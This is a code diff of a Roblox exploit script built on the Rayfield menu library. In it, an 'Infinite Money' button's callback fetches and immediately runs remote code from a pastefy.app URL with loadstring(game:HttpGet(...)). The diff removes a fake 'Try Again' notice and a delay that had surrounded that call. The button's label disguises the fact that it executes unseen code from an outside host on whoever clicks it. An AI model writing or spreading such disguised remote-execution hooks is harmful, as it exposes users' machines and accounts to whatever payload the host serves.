@@ -77,15 +77,7 @@ ModsTab:CreateButton({
     Name = "Infinite Money",
     Callback = function()
         print("Infinite Money button clicked")
-        Rayfield:Notify({
-            Title = "Notice",
-            Content = "Try Again",
-            Duration = 3
-        })
-        task.spawn(function()
-            wait(3)
-            loadstring(game:HttpGet("https://pastefy.app/Ym83DFAi/raw"))()
-        end)
+        loadstring(game:HttpGet("https://pastefy.app/Ym83DFAi/raw"))()
     end
 })
 
